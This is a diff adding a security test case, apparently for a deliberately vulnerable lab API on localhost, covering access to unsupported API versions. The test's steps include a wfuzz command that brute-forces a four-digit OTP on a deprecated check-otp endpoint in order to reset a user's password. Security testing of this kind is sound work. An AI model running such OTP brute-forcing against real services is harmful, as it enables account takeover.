@@ -181,3 +181,50 @@ DELETE /identity/api/v2/user/videos/{id}
 > 1. User Shouldn't be able to edit content on another user's page; 
 > 
 ------------------------------------------------------------------------------------------
+> 
+wfuzz -d '{"email":"user@test.com", "otp":"FUZZ","password":"12345Qwert!"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://127.0.0.1:8888/identity/api/auth/v2/check-otp --hc 500
+>
+> # Improper Inventory Management
+>
+> ## TC#01 Improper Assets Management
+>
+>> ### 'Should not access to unsupported and non-production versions of an API'
+>
+> Scope:
+>
+```
+GET /identity/api/{{ver}}/user/dashboard
+POST /identity/api/{{ver}}/user/videos/
+PUT /identity/api/{{ver}}/user/videos/
+DELETE /identity/api/{{ver}}/vehicle/vehicles
+POST /identity/api/{{ver}}/user/change-email
+POST /identity/api/{{ver}}/user/pictures
+POST /identity/api/{{ver}}/user/reset-password
+POST /identity/api/auth/{{ver}}/check-otp
+GET /community/api/{{ver}}/community/posts/recent
+POST /community/api/{{ver}}/community/posts
+GET /community/api/{{ver}}/community/posts/
+POST /community/api/{{ver}}/community/posts/{{post_id}}/comment
+```
+>
+> Test Data:
+> 1. email: user@test.com; password: 12345Qwert!; otp: 'anyvalue'
+>
+> Steps:
+>
+> 1. Create a new environment variable in postman for api version {{env}}
+> 2. Run the collection one by one with api1, api2, api3 value in variable
+> 3. Analyze the responses in each collection with different api variable
+> 4. Note that `POST /identity/api/auth/api2/check-otp` request has different response: `Invalid OTP! Please try again..`
+> 5. Fuzz the request with command:
+```
+wfuzz -d '{"email":"user@test.com", "otp":"FUZZ","password":"12345Qwert!"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://127.0.0.1:8888/identity/api/auth/v2/check-otp --hc 500
+```
+> 6. Note that gives us otp number with response 200
+> 7. Put received otp value in request and send the request. 
+>
+> Expected result:
+> 
+> 1. User should be able to change the password in old api by fuzzing otp request receiving correct value
+> 
+------------------------------------------------------------------------------------------
